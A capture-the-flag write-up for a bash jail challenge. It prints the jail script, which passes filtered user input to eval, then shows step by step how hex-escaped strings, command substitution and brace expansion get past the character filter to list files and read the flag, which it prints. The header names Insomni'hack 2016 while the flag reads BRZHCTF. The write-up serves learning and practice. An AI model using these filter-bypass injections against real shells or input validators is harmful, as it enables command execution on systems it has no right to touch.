#Insomni'hack CTF 2016 : PCAPBleeding

**Category:** JAIL |
**Points:** 300 |
**Solves:** 7% |
**Description:** 

> BASHJAIL



---

##Code and Write-up

Here is the code :

```bash
#!/bin/bash
. /home/game/.omg

_start(){
    echo "Hi. U got $TIME second(s) to do this. Don't fap"
    sleep "$TIME"
    _quit
}

_quit(){
    echo -e '\n\033[0;31mA breton is faster than u. Bye\033[0m'
    kill -9 "$PID" &>/dev/null
    exit
}

_trapped(){
    kill "$sPID"
    local TIME="$((RANDOM%1337))"
    echo -e "Poor guyz. U wanna leave this GAME ?\nStay with me for "$TIME"s <3.\nTake a drink? For milk, ask @saxx. For beer, ask @kaluche"
    sleep "$TIME"
}


_is_hacker_or_breton(){
        [[ $1 == *[02abcdefghijklmnopqrstuvwyzABDEFGHIJKLMNOPQRSTUVWXYZ';''&'' ''"''*''`''?''.''<''>']* ]] && return 0
        return 1
}

PID="$$"
echo "PIIIID : $PID"
trap _trapped SIGINT SIGTERM
TIME=5 ; _start & sPID="$!" ; sleep 0.01

while true; do
    echo -ne "\033[32mEnter a cmd > \033[0m"
    read cmd
    _is_hacker_or_breton "$cmd" && {
            echo -e '\033[0;31mDont hack me !\033[0m'
            exit 1
        } || {
            out="echo Your command is: $cmd"
            eval "$out"
    }
done
```

Here, the .omg file : [.omg](https://github.com/notfound-404/BREIZHCTF2K16/)

The first thing to do, was to ^c to kill the timeout, and to get a small sleep.
You can see it's RANDOM.

```
Poor guyz. U wanna leave this GAME ?
Stay with me for 1182s <3.
Take a drink? For milk, ask @saxx. For beer, ask @kaluche
Poor guyz. U wanna leave this GAME ?
Stay with me for 881s <3.
Take a drink? For milk, ask @saxx. For beer, ask @kaluche
Poor guyz. U wanna leave this GAME ?
Stay with me for 906s <3.
Take a drink? For milk, ask @saxx. For beer, ask @kaluche
Poor guyz. U wanna leave this GAME ?
Stay with me for 600s <3.
Take a drink? For milk, ask @saxx. For beer, ask @kaluche
Poor guyz. U wanna leave this GAME ?
Stay with me for 8s <3.
Take a drink? For milk, ask @saxx. For beer, ask @kaluche
```

Well, 8s is quiet small.
Now, you can easily find unfiltered chars, by testing them manually.
The following wasn't filtered :

```
Enter a cmd > $'x13456789{}()\\
Enter a cmd >
```

Knowing that, and knowing a little bash, you can try a `ls` :

```
Enter a cmd > $'\\x6C\\x73'
Your command is: ls
```

Ok, the command is not filtered but not executed ...
Well, try to executed is using `$(cmd)`

```
Enter a cmd > $($'\\x6C\\x73')
Your command is: flag jail.sh
```

Good, the command was executed.
You can see 2 files, `flag` and `jail.sh`

Let's try to `cat flag` :
```
Enter a cmd > $($'\\x63\\x61\\x74\\x20\\x66\\x6C\\x61\\x67')
Dont hack me !
```

Oh, right. `\\x20` contains filtered chars.<br>
If you were stuck here, you just had to Google : `bash commands without spaces`<br>
(https://jon.oberheide.org/blog/2008/09/04/bash-brace-expansion-cleverness/)

An example :

```bash
jonojono@apollo ~ $ {echo,hello,world}
hello world
```

We know that `{}` are not filtered, let's try this :
```
Enter a cmd > $({$'\\x63\\x61\\x74',$'\\x66\\x6C\\x61\\x67'})
Your command is: BRZHCTF{...}
```


<br>
Pwned.<br>
__Flag__ : BRZHCTF{Yes_I_allow_u_to_hate_me...I_am_Notfound_and_I_love_b4sh.I_also_love_long_flag,saxxounette_and_kalouchi_and_the_others_trollz}

Enjoy,<br>
\- [Notfound](https://www.notfound.ovh)

